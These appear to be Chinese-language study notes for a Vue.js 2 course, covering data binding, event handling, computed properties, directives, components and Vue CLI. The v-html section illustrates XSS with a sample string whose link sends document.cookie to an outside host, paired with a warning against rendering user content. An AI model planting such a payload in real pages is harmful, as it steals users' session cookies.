# Vue.js基础(P1-P60)

## 0教程简介

视频教程: [尚硅谷Vue2.0+Vue3.0全套教程丨vuejs从入门到精通](https://www.bilibili.com/video/BV1Zy4y1K7SH?p=1&vd_source=6e9c2de5b89c2ba4e13469e295319397) by**张天禹**

## 1Vue的简介

### 1.1Vue是什么?

Vue (读音 /vjuː/，类似于 **view**) 是一套用于构建用户界面的**渐进式框架**

- 易用
- 灵活
- 高效

### 1.2Vue的历史

2013年 - **尤雨溪**开发了一套轻量js框架-Seed,同年12月,Seed更名为Vue,版本号0.6.0

2014年 - Vue对外发布,版本号0.8.0

2015年 - 10月27日,正式发布Vue1.0.0 Evangelion

2016年 - 10月1日,正式发布Vue2.0.0 Ghost in the Shell

2020年 - 9月18日,正式发布Vue3.0.0 OnePiece

### 1.3Vue的特点

- 组件化: 提高代码复用率
- 声明式: 虚拟DOM,提高效率
- 虚拟DOM + Diff算法,提高虚拟DOM复用率

## 2Vue的官网

- 教程
- API
- AwesomeVue

## 3Vue的环境搭建

- vue-dev-tools
- `Vue.config.productionTip = false; // 关闭生产者提示`

## 4元素属性与数据属性(`el`与`data`)

```html
<div id="root">
    <h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
</div>
```

### 4.1挂载

- 方式一

```js
const vm = new Vue({
    el: "#root",
})
```

- 方式二

```js
vm.$mount("#root");
```

### 4.2数据

- 对象式

```js
const vm = new Vue({
    el: "#root",
    data: {
        name: "atguigu",
        address: "北京",
    },
})
```

- 函数式

```js
const vm = new Vue({
    el: "#root",
    data(){
        return{
            name: "尚硅谷",
            address: "北京",
        }
    }
})
```

### 4.3数据绑定

- 单向绑定 v-bind

```html
<input type="text" v-bind:value="name" />
<input type="text" :value="name" />
```

- 双向绑定 v-model

```html
<input type="text" v-model:value="name" />
<input type="text" v-model="name" />
```

### 4.4数据代理

- `Object.defineProperty()`方法中的getter和setter
- `vm._data`

## 5Vue的事件处理

### 5.1事件处理

- 不传参

```html
<button v-on:click="showInfo">点我提示信息</button>
<button @click="showInfo">点我提示信息</button>
```

```js
methods:{
    "showInfo" : function(){
        alert('同学你好！')
    }
}
```

```js
methods:{
    showInfo(){
        alert('同学你好！')
    }
}
```

- 传参

```html
<button @click="showInfo1">点我提示信息1（不传参）</button>
<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
```

```js
methods: {
    showInfo1(event) {
        console.log(event.target)
        alert("同学你好！");
    },
    showInfo2(event, number) {
        console.log(number);
        console.log(event.target)
        alert("同学你好！！");
    },
}
```

### 5.2事件修饰符

Vue中的事件修饰符：

- prevent：阻止默认事件（常用）；
- stop：阻止事件冒泡（常用）；
- once：事件只触发一次（常用）；
- capture：使用事件的捕获模式；
- self：只有event.target是当前操作的元素时才触发事件；
- passive：事件的默认行为立即执行，无需等待事件回调执行完毕；

```html
<button @click.once="showInfo">点我提示信息</button>
```

```js
methods:{
    showInfo(){
        alert('同学你好！')
    }
}
```

```html
<!-- 阻止单击事件继续传播 -->
<a v-on:click.stop="doThis"></a>

<!-- 提交事件不再重载页面 -->
<form v-on:submit.prevent="onSubmit"></form>

<!-- 修饰符可以串联 -->
<a v-on:click.stop.prevent="doThat"></a>

<!-- 只有修饰符 -->
<form v-on:submit.prevent></form>

<!-- 添加事件监听器时使用事件捕获模式 -->
<!-- 即内部元素触发的事件先在此处理，然后才交由内部元素进行处理 -->
<div v-on:click.capture="doThis">...</div>

<!-- 只当在 event.target 是当前元素自身时触发处理函数 -->
<!-- 即事件不是从内部元素触发的 -->
<div v-on:click.self="doThat">...</div>
```



### 5.3键盘事件

1.Vue中常用的按键别名：

- 回车 => enter
- 删除 => delete (捕获“删除”和“退格”键)
- 退出 => esc
- 空格 => space
- 换行 => tab (特殊，必须配合keydown去使用)
- 上 => up
- 下 => down
- 左 => left
- 右 => right

2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

```html
<input v-on:keyup.page-down="onPageDown">
```

3.系统修饰键（用法特殊）：ctrl、alt、shift、meta

- 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。

- 配合keydown使用：正常触发事件。

```html
<!-- Alt + C -->
<input v-on:keyup.alt.67="clear">

<!-- Ctrl + Click -->
<div v-on:click.ctrl="doSomething">Do something</div>
```

4.也可以使用keyCode去指定具体的按键（不推荐）

5.`Vue.config.keyCodes.自定义键名 = 键码`，可以去定制按键别名

```html
<input
       type="text"
       placeholder="按下回车提示输入"
       @keydown.huiche="showInfo"
/>
```

```js
Vue.config.keyCodes.huiche = 13; //定义了一个别名按键
```

```js
methods: {
    showInfo(e) {
        // console.log(e.key,e.keyCode)
        console.log(e.target.value);
    },
},
```

6.exact修饰符

```html
<!-- 即使 Alt 或 Shift 被一同按下时也会触发 -->
<button v-on:click.ctrl="onClick">A</button>

<!-- 有且只有 Ctrl 被按下的时候才触发 -->
<button v-on:click.ctrl.exact="onCtrlClick">A</button>

<!-- 没有任何系统修饰符被按下的时候才触发 -->
<button v-on:click.exact="onClick">A</button>
```

7.鼠标按钮修饰符

- `.left`
- `.right`
- `.middle`

## 6计算属性(`computed`)

- 计算属性getter和setter

```js
const vm = new Vue({
    el: "#root",
    data: {
        firstName: "张",
        lastName: "三",
    },
    computed: {
        fullName: {
            //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
            //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
            get() {
                console.log("get被调用了");
                return this.firstName + "-" + this.lastName;
            },
            set(value) {
                const arr = value.split("-");
                this.firstName = arr[0];
                this.lastName = arr[1];
            },
        },
    },
});
```

- 只有getter,可以简写

```js
computed:{
    fullName(){
        console.log("get被调用了")
        return this.firstName + "-" + this.lastName
    }
}
```

## 7监视属性(`watch`)

```js
watch:{
	isHot:{ // 监视isHot
		immediate:true, //初始化时让handler调用一下
        deep:true, // 深度监视
        handler(newValue,oldValue){
        	console.log(newValue,oldValue);
        }
    }
}
```

```js
vm.$watch("isHot", (newValue, oldValue) => {
    console.log("isHot被修改了", newValue, oldValue);
});
```

## 8绑定样式(`:class` `:style`)

```css
.basic {
    width: 400px;
    height: 100px;
    border: 1px solid black;
}
.happy {
    border: 4px solid red;
    background-color: rgba(255, 255, 0, 0.644);
    background: linear-gradient(30deg, yellow, pink, orange, yellow);
}
.sad {
    border: 4px dashed rgb(2, 197, 2);
    background-color: gray;
}
.normal {
    background-color: skyblue;
}
.atguigu1 {
    background-color: yellowgreen;
}
.atguigu2 {
    font-size: 30px;
    text-shadow: 2px 2px 10px red;
}
.atguigu3 {
    border-radius: 20px;
}
```

```html
<div id="root">
    <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
    <br /><br />

    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
    <div class="basic" :class="classArr">{{name}}</div>
    <br /><br />

    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
    <div class="basic" :class="classObj">{{name}}</div>
    <br /><br />

    <!-- 绑定style样式--对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div>
    <br /><br />
    <!-- 绑定style样式--数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>
</div>
```

```js
const vm = new Vue({
    el: "#root",
    data: {
        name: "尚硅谷",
        mood: "normal",
        classArr: ["atguigu1", "atguigu2", "atguigu3"],
        classObj: {
            atguigu1: false,
            atguigu2: false,
        },
        styleObj: {
            fontSize: "40px",
            color: "red",
        },
        styleObj2: {
            backgroundColor: "orange",
        },
        styleArr: [
            {
                fontSize: "40px",
                color: "blue",
            },
            {
                backgroundColor: "gray",
            },
        ],
    },
    methods: {
        changeMood() {
            const arr = ["happy", "sad", "normal"];
            const index = Math.floor(Math.random() * 3);
            this.mood = arr[index];
        },
    },
});
```

## 9条件渲染(`v-if` `v-show`)

- `v-show` 为`false`时, `display:none`

```html
<h2 v-show="false">欢迎</h2>
<h2 v-show="1 === 1">欢迎</h2>
```

- `v-if` 为 `false`时, 直接生成DOM节点

```html
<h2 v-if="false">欢迎</h2>
<h2 v-if="1 === 1">欢迎</h2>

<!-- v-else和v-else-if -->
<div v-if="n === 1">Angular</div>
<div v-else-if="n === 2">React</div>
<div v-else-if="n === 3">Vue</div>
<div v-else>哈哈</div>

<!-- v-if与template的配合使用 -->
<template v-if="n === 1">
    <h2>你好</h2>
    <h2>尚硅谷</h2>
    <h2>北京</h2>
</template>
```

## 10列表渲染(`v-for`)

- `v-for...in...` 与 `v-for...of...` 相同都可遍历数组与对象
- js中`for...in...`能遍历数组和对象, `for...of...`只能遍历数组

```html
<!-- 
v-for指令:
1.用于展示列表数据
2.语法：v-for="(item, index) in xxx" :key="yyy"
3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
-->
<!-- 准备好一个容器-->
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表（遍历数组）</h2>
    <ul>
        <li v-for="(p,index) of persons" :key="index">
            {{p.name}}-{{p.age}}
        </li>
    </ul>

    <!-- 遍历对象 -->
    <h2>汽车信息（遍历对象）</h2>
    <ul>
        <li v-for="(value,k) of car" :key="k">
            {{k}}-{{value}}
        </li>
    </ul>

    <!-- 遍历字符串 -->
    <h2>测试遍历字符串（用得少）</h2>
    <ul>
        <li v-for="(char,index) of str" :key="index">
            {{char}}-{{index}}
        </li>
    </ul>

    <!-- 遍历指定次数 -->
    <h2>测试遍历指定次数（用得少）</h2>
    <ul>
        <li v-for="(number,index) of 5" :key="index">
            {{index}}-{{number}}
        </li>
    </ul>
</div>
```

```js
new Vue({
    el:'#root',
    data:{
        persons:[
            {id:'001',name:'张三',age:18},
            {id:'002',name:'李四',age:19},
            {id:'003',name:'王五',age:20}
        ],
        car:{
            name:'奥迪A8',
            price:'70万',
            color:'黑色'
        },
        str:'hello'
    }
});
```

- 在`<template>`上使用`v-for`

```html
<ul>
  <template v-for="item in items">
    <li>{{ item.msg }}</li>
    <li class="divider" role="presentation"></li>
  </template>
</ul>
```

- 数组更新检测

  Vue 将被侦听的数组的变更方法进行了包裹，所以它们也将会触发视图更新。这些被包裹过的方法包括：

  - `push()`
  - `pop()`
  - `shift()`
  - `unshift()`
  - `splice()`
  - `sort()`
  - `reverse()`

## 11`set`方法实现数据响应式

- `Vue.set()`可以把vue实例中的数据实现响应式

```js
Vue.set(vm.student,'sex','男');
vm.$set(vm.student,'sex','男');
```



## 12表单输入

1. 收集表单数据：

- `<input type="text"/>`，v-model收集的是value值，用户输入的就是value值。
- `<input type="radio"/>`，v-model收集的是value值，且要给标签配置value值。
- `<input type="checkbox"/>`
  - 1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  - 2.配置input的value属性:
    - v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    - v-model的初始值是数组，那么收集的的就是value组成的数组

2. 备注：v-model的三个修饰符：
   - lazy：失去焦点再收集数据
   - number：输入字符串转为有效的数字
   - trim：输入首尾空格过滤

```html
<div id="root">
    <form @submit.prevent="demo">
        账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
        密码：<input type="password" v-model="userInfo.password"> <br/><br/>
        年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
        爱好：
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        <br/><br/>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br/><br/>
        其他信息：
        <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
        <button>提交</button>
    </form>
</div>
```

```js
new Vue({
    el: "#root",
    data: {
        userInfo: {
            account: "",
            password: "",
            age: 18,
            sex: "female",
            hobby: [],
            city: "",
            other: "",
            agree: false,
        },
    },
    methods: {
        demo() {
            console.log(JSON.stringify(this.userInfo));
        },
    },
});
```

## 13过滤器(`filters`)

过滤器：

- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
- 语法：
  - 注册过滤器：`Vue.filter(name,callback)` 或 `new Vue{filters:{}}`
  - 使用过滤器：`{{ xxx | 过滤器名}}` 或  ` v-bind:属性 = "xxx | 过滤器名"`

- 备注：
  - 过滤器也可以接收额外参数、多个过滤器也可以串联
  - 并没有改变原本的数据, 是产生新的对应的数据

```html
<!-- 过滤器实现 -->
<h3>现在是：{{time | timeFormater}}</h3>
<!-- 过滤器实现（传参） -->
<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
<h3 :x="msg | mySlice">尚硅谷</h3>
```

- 局部过滤器

```js
// 局部过滤器
filters: {
    timeFormater(value, str = "YYYY年MM月DD日 HH:mm:ss") {
        return dayjs(value).format(str);
    },
},
```

- 全局过滤器(必须声明在`new Vue()`前面才能使用)

```js
// 全局过滤器
Vue.filter("mySlice", function (value) {
    return value.slice(0, 4);
});
```

## 14其他内置指令

### 14.1`v-txet`

- 作用：向其所在的节点中渲染文本内容,不支持结构解析
- 与插值语法的区别：`v-text`会替换掉节点中的内容，插值语法`{{xx}}`则不会

```html
<div v-text="name"></div>
<div v-text="str"></div>
```

```js
data: {
    name: "尚硅谷",
    str: "<h3>你好啊！</h3>",
},
```

### 14.2`v-html`

- 作用：向指定节点中渲染包含html结构的内容。

- 与插值语法的区别：

  - `v-html`会替换掉节点中所有的内容，插值语法`{{xx}}`则不会
  - `v-html`可以识别html结构

- 严重注意：`v-html`有安全性问题！！！！

  - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。

  - 一定要在可信的内容上使用`v-html`，永不要用在用户提交的内容上！

```html
<div v-html="str"></div>
<div v-html="str2"></div>
```

```js
data: {
    name: "尚硅谷",
    str: "<h3>你好啊！</h3>",
    str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
},
```

### 14.3`v-cloak`

- `v-cloak`指令（没有值）：
  - 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉`v-cloak`属性
  - 使用CSS配合`v-cloak`可以解决网速慢时页面展示出`{{xxx}}`的问题

```html
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
```

```css
[v-cloak]{
    display:none;
}
```

### 14.4`v-once`

-  `v-once`指令：
  - v-once所在节点在初次动态渲染后，就视为静态内容了
  - 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

```html
<h2 v-once>初始化的n值是:{{n}}</h2>
<h2>当前的n值是:{{n}}</h2>
<button @click="n++">点我n+1</button>
```

### 14.5`v-pre`

- ` v-pre`指令：
  - 跳过其所在节点的编译过程。
  - 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```html
<h2 v-pre>Vue其实很简单</h2>
<h2 >当前的n值是:{{n}}</h2>
<button @click="n++">点我n+1</button>
```

## 15自定义指令(`directives`)

```html
<h2>当前的n值是：<span v-text="n"></span> </h2>
<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
<button @click="n++">点我n+1</button>
<input type="text" v-fbind:value="n">
```

- 函数式

```js
directives: {
    // big函数何时会被调用？
    // 1.指令与元素成功绑定时（一上来）。
    // 2.指令所在的模板被重新解析时。
    big(element, binding) {
        console.log("big", this); // 注意此处的this是window
        element.innerText = binding.value * 10;
    },
},
```

- 对象式

```js
directives: {
    fbind: {
        // 指令与元素成功绑定时（一上来）
        bind(element, binding) {
            element.value = binding.value;
        },
        // 指令所在元素被插入页面时
        inserted(element, binding) {
            element.focus();
        },
		// 指令所在的模板被重新解析时
        update(element, binding) {
            element.value = binding.value;
        },
    },
},
```

- 全局指令

```js
Vue.directive("fbind", {
    // 指令与元素成功绑定时（一上来）
    bind(element, binding) {
        element.value = binding.value;
    },
    // 指令所在元素被插入页面时
    inserted(element, binding) {
        element.focus();
    },
    // 指令所在的模板被重新解析时
    update(element, binding) {
        element.value = binding.value;
    },
});
```

​    自定义指令总结：

- 定义语法：
  - 局部指令
  - 全局指令

- 配置对象中常用的3个回调：.
  - bind：指令与元素成功绑定时调用。
  - inserted：指令所在元素被插入页面时调用。
  - update：指令所在模板结构被重新解析时调用。

- 备注：
  - 指令定义时不加v-，但使用时要加v-
  - 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名

## 16生命周期钩子

详细请看视频教程

<img src="https://cn.vuejs.org/images/lifecycle.png" alt="Vue 实例生命周期" style="zoom:50%;" align="left"/>

## 17组件

### 17.1非单文件组件

详细请看视频教程

- 创建组件:`Vue.extend()`

```js
const school = Vue.extend({
    template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
				</div>
			`,
    data(){
        return {
            schoolName:'尚硅谷',
            address:'北京昌平'
        }
    },
    methods: {
        showName(){
            alert(this.schoolName)
        }
    },
})
```

- 注册组件(局部注册)

```js
new Vue({
    el:'#root',
    data:{
        msg:'你好啊！'
    },
    //第二步：注册组件（局部注册）
    components:{
        school
    }
})
```

- 注册组件(全局注册)

```js
Vue.component("school", school);
```

- 使用组件

```html
<div id="root">
    <hello></hello>
    <hr>
    <h1>{{msg}}</h1>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <school></school>
</div>
```

### 17.2单文件组件



## [18VueCLI](https://cli.vuejs.org/zh/)

[VueCLI](https://cli.vuejs.org/zh/)(Vue脚手架)是Vue.js开发的标准工具

### [18.1安装](https://cli.vuejs.org/zh/guide/installation.html)

1. 全局安装

```shell
npm install -g @vue/cli
```

2. 升级

```shell
npm update -g @vue/cli
```

### [18.2创建一个项目](https://cli.vuejs.org/zh/guide/creating-a-project.html)

```shell
vue create hello-world
```



## 19ref

```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">Click me to show DOM</button>
		<SchoolItem ref="si"></SchoolItem>
	</div>
</template>

<script>
	import SchoolItem from "./components/SchoolItem.vue";
	export default {
		name: "App",
		data() {
			return {
				msg: "Welcome to atguigu",
			};
		},
		methods: {
			showDOM() {
				console.log(this.$refs.title);
				console.log(this.$refs.btn);
				console.log(this.$refs.si);
			},
		},
		components: {
			SchoolItem,
		},
	};
</script>
```

## 20mixin























